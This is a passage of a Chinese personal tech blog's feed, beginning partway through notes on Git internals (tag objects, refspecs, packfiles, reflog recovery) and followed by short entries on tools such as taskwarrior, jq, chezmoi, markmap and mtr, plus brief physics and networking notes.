标签对象"></a>10.3.2 标签对象</h3><p>标签对象与提交对象类似，其包含:</p><ul><li>标签创建者</li><li>一个日期</li><li>一条消息</li><li>一个指针</li></ul><p>但标签对象通常指向的是提交对象，而不是树对象.</p><p>有两种类型的标签:</p><ul><li>注释标签</li><li>轻量标签</li></ul><p>创建一个轻量标签, 其不会创建标签对象:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git update-ref refs/tags/v1.0 哈希值<br></code></pre></td></tr></table></figure><p><code>.git/refs/tags/v1.0</code> 文件中的内容是提交对象的哈希值.</p><p>创建一个注释标签，其会创建一个标签对象.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git tag -a v1.1 哈希值 -m <span class="hljs-string">&#x27;test tag&#x27;</span><br></code></pre></td></tr></table></figure><p><code>-a</code> 参数指明要创建一个注释标签. </p><p><code>.git/refs/tags/v1.1</code> 文件中的内容是标签对象的哈希值.</p><h3 id="10-3-3-远程引用"><a href="#10-3-3-远程引用" class="headerlink" title="10.3.3 远程引用"></a>10.3.3 远程引用</h3><p>添加远程仓库并向其推送，Git 会将最后一次推送到该远程仓库的每一分支的值保存在 <code>refs/remotes</code> 目录中.</p><p>远程引用与分支 (refs&#x2F;heads 目录下的引用) 的主要不同在于前者是只读，可以对其使用 <code>git checkout</code>，但是 Git 不会使 HEAD 指向它，因此也就无法使用 commit 命令更新远程引用.</p><h2 id="10-4-包文件"><a href="#10-4-包文件" class="headerlink" title="10.4 包文件"></a>10.4 包文件</h2><p>查看对象的大小用 <code>git cat-file -s 哈希值</code>.</p><p>一个文件提交后，修改部分内容再次提交，新的对象并不是只保存差异.</p><p>Git 在磁盘上保存对象所采用的格式叫做 “松散式” 对象格式，但有时为了节省磁盘空间和提高操作效率，Git 会将最个这种格式的对象打包塞进一个叫做 “包文件” 的二进制文件中。</p><p>可手动执行 <code>git gc</code> 命令要求 Git 打包这些对象.</p><p>上述命令会删除提交了的对象，并创建包文件和索引文件，</p><ul><li>包文件中包含了从文件系统中删除的所有对象</li><li>索引文件包含了针对包文件内容的偏移 (毕竟几个文件的内容都放进了一个文件中，要知道那一部分是哪一个文件)</li></ul><p>打包可以进一步压缩空间。此时 Git 会查找名称和大小相近的文件，只保存不同版本之间的差异. 第二个版本完整地保存了文件内容，而原始版本是以差异方式保存的 (毕竟大部分访问的都是文件的最新版本).</p><p>可以用:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git verify-pack -v .git/objects/pack/pack-这是文件名<br></code></pre></td></tr></table></figure><p>查看打包的内容.</p><h2 id="10-5-引用规格"><a href="#10-5-引用规格" class="headerlink" title="10.5 引用规格"></a>10.5 引用规格</h2><p>若添加了一个远程仓库, 如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git remote add origin https://github.com/schacom/simplegit-progit<br></code></pre></td></tr></table></figure><p>该命令会在 <code>.git/config</code> 文件中添加内容, 包括:</p><ul><li>远程仓库名称，如 origin</li><li>URL</li><li>用于获取的引用规格</li></ul><p>如:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">[remote <span class="hljs-string">&quot;origin&quot;</span>] <br>    url = https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/schacom/</span>simplegit-progit<br>    fetch = +refs<span class="hljs-regexp">/heads/</span>*:refs<span class="hljs-regexp">/remotes/</span>origin/*<br></code></pre></td></tr></table></figure><p><code>fetch</code> 的格式为:</p><ul><li>可选的 <code>+</code>, 指示 Git 更新引用</li><li><code>&lt;src&gt;:&lt;dst&gt;</code>, <code>&lt;src&gt;</code> 是远程端的引用样式, <code>&lt;dst&gt;</code> 是远程引用在本地要写入的位置</li></ul><p>Git 获取服务器端 <code>refs/heads/</code> 下的所有引用，然后将其写入到本地的 <code>refs/remotes/origin/</code>.</p><p>可指定多个引用规格，即拉取多个分支:</p><p>命令如下:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git fetch origin master:refs/remote/origin/mymaster \<br>    topic:refs/remote/origin/mymaster<br></code></pre></td></tr></table></figure><p>修改 <code>.git/config</code> 文件:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">[remote <span class="hljs-string">&quot;origin&quot;</span>]<br>    url = https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/schacom/</span>simplegit-progit<br>    fetch = +refs<span class="hljs-regexp">/heads/m</span>aster:refs<span class="hljs-regexp">/remotes/</span>origin/master<br>    fetch = +refs<span class="hljs-regexp">/heads/</span>experiment:refs<span class="hljs-regexp">/remotes/</span>origin/experiment<br></code></pre></td></tr></table></figure><h3 id="10-5-1-推送引用规格"><a href="#10-5-1-推送引用规格" class="headerlink" title="10.5.1 推送引用规格"></a>10.5.1 推送引用规格</h3><p>命令如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git push origin master:refs/heads/qa/master<br></code></pre></td></tr></table></figure><p>配置文件为:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">[remote <span class="hljs-string">&quot;origin&quot;</span>]<br>    url = https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/schacom/</span>simplegit-progit<br>    fetch = +refs<span class="hljs-regexp">/heads/</span>*:refs<span class="hljs-regexp">/remotes/</span>origin/*<br>    push = refs<span class="hljs-regexp">/heads/m</span>aster:refs<span class="hljs-regexp">/heads/</span>qa/master<br></code></pre></td></tr></table></figure><h3 id="10-5-2-删除引用"><a href="#10-5-2-删除引用" class="headerlink" title="10.5.2 删除引用"></a>10.5.2 删除引用</h3><p>从远程服务器中删除引用:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git push origin :topic<br></code></pre></td></tr></table></figure><h2 id="10-6-传输协议"><a href="#10-6-传输协议" class="headerlink" title="10.6 传输协议"></a>10.6 传输协议</h2><p>主要使用两个传输协议:</p><ul><li>“哑” (dumb) 协议</li><li>“智能” (smart) 协议</li></ul><h3 id="10-6-1-哑协议"><a href="#10-6-1-哑协议" class="headerlink" title="10.6.1 哑协议"></a>10.6.1 哑协议</h3><h3 id="10-6-2-智能协议"><a href="#10-6-2-智能协议" class="headerlink" title="10.6.2 智能协议"></a>10.6.2 智能协议</h3><h2 id="10-7-维护与数据恢复"><a href="#10-7-维护与数据恢复" class="headerlink" title="10.7 维护与数据恢复"></a>10.7 维护与数据恢复</h2><p><code>git gc</code> 中的 <code>gc</code> 是 garbage collect (垃圾回收) 的缩写. 其:</p><ul><li>收集所有的松散对象并将其放到包文件中</li><li>将多个包文件合并成一个大的包文件</li><li>删除没有与任何提交关联的成旧对象</li></ul><p>可以修改 <code>gc.autol</code> 和 <code>gc.autopacklimit</code> 来配置.</p><h2 id="10-7-2-数据恢复"><a href="#10-7-2-数据恢复" class="headerlink" title="10.7.2 数据恢复"></a>10.7.2 数据恢复</h2><p>在使用 <code>git reset --hard 哈希值</code> 重置到一个旧的分支后，无法得知最后一次提交的 SHA-1 值。可使用 <code>git reflog</code> 工具查看.</p><p>每次提交或修改分支，引用日志 (reflog) 都会更新。</p><p><code>git update-ref</code> 命令也会更新日志.</p><p>使用 <code>git log -g</code> 命令会将引用日志 (reflog) 按照正常的日志格式输出.</p><p>引用日志的内容保存在 <code>.git/logs</code> 中，若引用日志被删除，使用:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git fsck --full<br></code></pre></td></tr></table></figure><p>其会检查数据的完整性，显示出所有没有被其他对象指向的对象.</p><h3 id="10-7-3-移除对象"><a href="#10-7-3-移除对象" class="headerlink" title="10.7.3 移除对象"></a>10.7.3 移除对象</h3><p><code>git clone</code> 会下载项目的整个历史记录，包括每一个文件的每一个版本.</p><p>有人添加了一个大文件在提交历史中，就算在本次提交删除，该文件也一直存在到提交历史中.</p><p>想要彻底删除这个文件的方法，可能会破坏提交历史.</p><p>可以执行 <code>count-objects</code> 命令快速查看磁盘空间的使用情况: </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git count-objects -v<br></code></pre></td></tr></table></figure><p>查找大体积文件:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git verify-pack -v .git/objects/pack/pack-29_69.odx \<br>  | <span class="hljs-built_in">sort</span> -k 3 -n \<br>  | <span class="hljs-built_in">tail</span> -3<br></code></pre></td></tr></table></figure><p>具体删除操作看书.</p><h2 id="10-8-环境变量"><a href="#10-8-环境变量" class="headerlink" title="10.8 环境变量"></a>10.8 环境变量</h2><h3 id="10-8-1-全局行为"><a href="#10-8-1-全局行为" class="headerlink" title="10.8.1 全局行为"></a>10.8.1 全局行为</h3><p><code>GIT_EXEC_PATH</code> 决定了 Git 从哪里查找它的子程序 (如 git-commit, git-diff). 可以用:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git --exec-path<br></code></pre></td></tr></table></figure><p>来检查当前设置.</p><p>Git 通过 <code>HOME</code> 查找全局配置文件.</p><p><code>GIT-PAGER</code> 用于控制在命令行上显示多页输出的程序，没有设置则使用 <code>PAGER</code></p><p>Git 运行 <code>GIT_EDITOR</code> 作为编辑器，如果没有设置，则使用 <code>EDITOR</code></p><p>还有 <code>PREFIX</code>, <code>GIT_CONFIG_NOSYSTEM</code>, 具体看书.</p><h3 id="10-8-2-仓库位置"><a href="#10-8-2-仓库位置" class="headerlink" title="10.8.2 仓库位置"></a>10.8.2 仓库位置</h3><h3 id="10-8-3-路径规格"><a href="#10-8-3-路径规格" class="headerlink" title="10.8.3 路径规格"></a>10.8.3 路径规格</h3><h3 id="10-8-4-提交"><a href="#10-8-4-提交" class="headerlink" title="10.8.4 提交"></a>10.8.4 提交</h3><h3 id="10-8-5-网络"><a href="#10-8-5-网络" class="headerlink" title="10.8.5 网络"></a>10.8.5 网络</h3><h3 id="10-8-6-差异和合并"><a href="#10-8-6-差异和合并" class="headerlink" title="10.8.6 差异和合并"></a>10.8.6 差异和合并</h3><h3 id="10-8-7-调试"><a href="#10-8-7-调试" class="headerlink" title="10.8.7 调试"></a>10.8.7 调试</h3><h3 id="10-8-8-杂项"><a href="#10-8-8-杂项" class="headerlink" title="10.8.8 杂项"></a>10.8.8 杂项</h3>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>dotfile-管理-chezmoi-使用</title>
    <link href="/2022/11/04/dotfile-%E7%AE%A1%E7%90%86-chezmoi-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/11/04/dotfile-%E7%AE%A1%E7%90%86-chezmoi-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.chezmoi.io/quick-start/#next-steps">官网</a></p><p>如果命令不管用，就直接从 github 拉下来，重命名为 <code>~/.local/share/chezmoi</code> 后执行:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ chezmoi -v apply<br></code></pre></td></tr></table></figure><p>即可.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>python-的命令行文档-pydoc</title>
    <link href="/2022/11/04/python-%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%96%87%E6%A1%A3-pydoc/"/>
    <url>/2022/11/04/python-%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%96%87%E6%A1%A3-pydoc/</url>
    
    <content type="html"><![CDATA[<p><a href="https://docs.python.org/3/library/pydoc.html">参考</a></p><p>直接在命令行使用即可, 如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pydoc socket<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-pip-不能下载-socket-模块</title>
    <link href="/2022/11/04/%E5%85%B3%E4%BA%8E-pip-%E4%B8%8D%E8%83%BD%E4%B8%8B%E8%BD%BD-socket-%E6%A8%A1%E5%9D%97/"/>
    <url>/2022/11/04/%E5%85%B3%E4%BA%8E-pip-%E4%B8%8D%E8%83%BD%E4%B8%8B%E8%BD%BD-socket-%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[<p>socket 模块为 python 的标准库模块，不需要额外安装.</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MPlayer-使用</title>
    <link href="/2022/11/03/MPlayer-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/11/03/MPlayer-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/MPlayer_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">参考</a></p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-you-get-速度缓慢</title>
    <link href="/2022/11/03/%E5%85%B3%E4%BA%8E-you-get-%E9%80%9F%E5%BA%A6%E7%BC%93%E6%85%A2/"/>
    <url>/2022/11/03/%E5%85%B3%E4%BA%8E-you-get-%E9%80%9F%E5%BA%A6%E7%BC%93%E6%85%A2/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bear962464.cn/2021/01/04/1001/">参考1 修改 UA</a></p><p><a href="https://www.google.com/search?client=firefox-b-d&q=%E6%9F%A5%E7%9C%8B+UA">参考2 查看 UA</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用-markmap-画思维导图</title>
    <link href="/2022/11/02/%E4%BD%BF%E7%94%A8-markmap-%E7%94%BB%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    <url>/2022/11/02/%E4%BD%BF%E7%94%A8-markmap-%E7%94%BB%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/markmap/coc-markmap">Github 页面</a></p><p>一个一级标题算一个分支，二级标题算是子分支.</p><p><code>-</code> ，即原来写序列用的作为子分支.</p><p>由于 <code>coc-markmap</code> 的安装问题，直接使用命令行下的替代.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ markmap file.md<br></code></pre></td></tr></table></figure><p>添加快捷键:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Vim"><span class="hljs-keyword">nnoremap</span> <span class="hljs-symbol">&lt;LEADER&gt;</span>pn :!markmap %<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用-markup-画思维导图</title>
    <link href="/2022/11/02/%E4%BD%BF%E7%94%A8-markup-%E7%94%BB%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    <url>/2022/11/02/%E4%BD%BF%E7%94%A8-markup-%E7%94%BB%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/markmap/coc-markmap">Github 页面</a></p><p>一个一级标题算一个分支，二级标题算是子分支.</p><p><code>-</code> ，即原来写序列用的作为子分支.</p><p>由于 <code>coc-markup</code> 的安装问题，直接使用命令行下的替代.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ markup file.md<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Markdown-画流程图</title>
    <link href="/2022/11/02/Markdown-%E7%94%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/"/>
    <url>/2022/11/02/Markdown-%E7%94%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="流程图-参考"><a href="#流程图-参考" class="headerlink" title="流程图 参考"></a><a href="https://juejin.cn/post/7038144693867118629">流程图 参考</a></h1><p>需添加代码块:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-code">```mermaid</span><br><span class="hljs-code">    </span><br><span class="hljs-code">\```</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>概率论与数理统计-陈希孺</title>
    <link href="/2022/11/02/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1-%E9%99%88%E5%B8%8C%E5%AD%BA/"/>
    <url>/2022/11/02/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1-%E9%99%88%E5%B8%8C%E5%AD%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章-事件的概率"><a href="#第一章-事件的概率" class="headerlink" title="第一章 事件的概率"></a>第一章 事件的概率</h1><h2 id="1-1-概率是什么"><a href="#1-1-概率是什么" class="headerlink" title="1.1 概率是什么"></a>1.1 概率是什么</h2><h3 id="1-1-2-试验与事件"><a href="#1-1-2-试验与事件" class="headerlink" title="1.1.2 试验与事件"></a>1.1.2 试验与事件</h3>]]></content>
    
    
    <categories>
      
      <category>Probability</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用-taskwarrior</title>
    <link href="/2022/11/02/%E4%BD%BF%E7%94%A8-taskwarrior/"/>
    <url>/2022/11/02/%E4%BD%BF%E7%94%A8-taskwarrior/</url>
    
    <content type="html"><![CDATA[<h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://taskwarrior.org/download/">参考1</a></h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>规划任务清单.</p><h2 id="ArchLinux-中下载"><a href="#ArchLinux-中下载" class="headerlink" title="ArchLinux 中下载"></a>ArchLinux 中下载</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo pacman -S taskwarrior-tui<br></code></pre></td></tr></table></figure><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p><code>add</code>, <code>list</code>, <code>done</code>.</p><h1 id="参考2-B站"><a href="#参考2-B站" class="headerlink" title="参考2 B站"></a><a href="https://www.bilibili.com/video/BV1pi4y1L7Vx/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考2 B站</a></h1><p>配置文件下有颜色主题.</p><h2 id="基本使用-1"><a href="#基本使用-1" class="headerlink" title="基本使用"></a>基本使用</h2><p>如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task 1 start<br>$ task 1 <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>用 <code>task all</code> 可以看到所有任务，尽管已经用 <code>done</code> 完成或 <code>delete</code> 删除.</p><p><code>modify</code> 可修改.</p><p>酷炫命令 <code>task burndown.daily</code>.</p><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><p>可以对一个 task 打上一个或多个标签.</p><p>使用 <code>+</code> 来增加标签, 如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task +homework English<br></code></pre></td></tr></table></figure><p>就会给 <code>English</code> 打上 <code>homework</code> 的标签.</p><p>过滤显示, 如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task +homework<br></code></pre></td></tr></table></figure><p>去除标签用 <code>-</code>, 也可以用来过滤不想显示的任务:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task 1 mod -homework<br>$ task -homework<br></code></pre></td></tr></table></figure><h3 id="虚拟标签"><a href="#虚拟标签" class="headerlink" title="虚拟标签"></a>虚拟标签</h3><p>其是内部封装的一些过滤条件.</p><p>如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task +TAGGED<br></code></pre></td></tr></table></figure><p>其过滤出打上了标签的任务.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task +TODAY<br></code></pre></td></tr></table></figure><p>最后一个添加的:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task +LATEST<br></code></pre></td></tr></table></figure><p><a href="https://taskwarrior.org/docs/tags/">官网合计标签</a></p><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>分两种:</p><ul><li>core attributes</li><li>user define attributes</li></ul><p>在 <code>task help</code> 中找到 <code>Build-in attributes</code> 可以看到所有的内置属性.</p><p>如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task <span class="hljs-string">&#x27;urgency&gt;1&#x27;</span><br></code></pre></td></tr></table></figure><p>还有:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task <span class="hljs-string">&#x27;description~test&#x27;</span><br></code></pre></td></tr></table></figure><p>项目 project:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task +LATEST mod project:工作<br></code></pre></td></tr></table></figure><p><code>project</code> 提示后面为添加的一个项目.</p><p>过滤:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task project.not:工作<br></code></pre></td></tr></table></figure><p><code>task</code> 其实默认添加了 <code>status:pending</code> 的过滤.</p><p>显示项目:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task projects<br></code></pre></td></tr></table></figure><p>项目可以有子项目.</p><h4 id="用户定义属性-uda"><a href="#用户定义属性-uda" class="headerlink" title="用户定义属性 uda"></a>用户定义属性 uda</h4><p>taskwarrior 支持四种类型:</p><ul><li>string</li><li>numeric</li><li>date</li><li>duration</li></ul><p><code>task config uda.estimate.type numeric</code></p><p><code>task info</code> 可以查看信息.</p><p>查看 <code>next</code> 报表显示的字段:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task show report.next<br></code></pre></td></tr></table></figure><p>可以直接修改 <code>.taskrc</code> 文件来配置.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-Archlinux-下-wps-无法打开</title>
    <link href="/2022/10/31/%E5%85%B3%E4%BA%8E-Archlinux-%E4%B8%8B-wps-%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80/"/>
    <url>/2022/10/31/%E5%85%B3%E4%BA%8E-Archlinux-%E4%B8%8B-wps-%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80/</url>
    
    <content type="html"><![CDATA[<p><a href="https://bbs.archlinuxcn.org/viewtopic.php?id=11216">参考</a></p><p>实测重装管用.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-jq-命令</title>
    <link href="/2022/10/31/%E5%85%B3%E4%BA%8E-jq-%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/10/31/%E5%85%B3%E4%BA%8E-jq-%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wangchujiang.com/linux-command/c/jq.html">参考</a></p><p><code>jq</code> 是一个轻量级的命令行 JSON 处理器.</p><p><code>jq</code> 将给定的过滤器应用于其 JSON 文本输入并在标准输出上将过滤器的结果生成为 JSON.</p><p>如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ $ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#123; &quot;foo&quot;: &#123; &quot;bar&quot;: &#123; &quot;baz&quot;: 123 &#125; &#125; &#125;&#x27;</span> | jq <span class="hljs-string">&#x27;.&#x27;</span><br>&#123;<br>  <span class="hljs-string">&quot;foo&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;bar&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;baz&quot;</span>: 123<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 <code>&#39;.&#39;</code> 是一个过滤器, 以漂亮的方式输出.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>网络相关随记</title>
    <link href="/2022/10/31/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E9%9A%8F%E8%AE%B0/"/>
    <url>/2022/10/31/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>个人的主机上面有 ARP 的映射表. 若只知道内网中某个主机的 IP 而不知道 MAC 的话还是要广播 ARP 查询的数据包.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-mtr-命令</title>
    <link href="/2022/10/31/%E5%85%B3%E4%BA%8E-mtr-%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/10/31/%E5%85%B3%E4%BA%8E-mtr-%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/my-show-time/p/15062134.html">参考</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>mtr</code> (My traceroute), 其将 <code>ping</code> 和 <code>traceroute</code> 的功能合并.</p><p>其能够避免节点波动对测试结果的影响.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于电动势</title>
    <link href="/2022/10/31/%E5%85%B3%E4%BA%8E%E7%94%B5%E5%8A%A8%E5%8A%BF/"/>
    <url>/2022/10/31/%E5%85%B3%E4%BA%8E%E7%94%B5%E5%8A%A8%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://www.bilibili.com/video/BV1VZ4y1V7Zj/?spm_id_from=333.788.recommend_more_video.-1&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考1</a></h1><p><img src="/../img/what_is_emf.png"></p><p>电池的作用, 电池中有能量, 其用来将负电荷从负极运送到正极. 当电池中的能量耗尽, 电子不能运送到正极, 电路中也就没了电流.</p><p><img src="/../img/higher_larger_emf.png"></p><p>电动势越大, 可以看作将电子搬运得越高.</p><p>可以将电动势视为搬运电荷的能力. 也就是单位电荷做功的大小.</p>]]></content>
    
    
    <categories>
      
      <category>Physics</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>网络拓扑图示例</title>
    <link href="/2022/10/31/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9B%BE%E7%A4%BA%E4%BE%8B/"/>
    <url>/2022/10/31/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9B%BE%E7%A4%BA%E4%BE%8B/</url>
    
    <content type="html"><![CDATA[<p><img src="/../img/network_topology.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>网页制作网站-Framer-的使用</title>
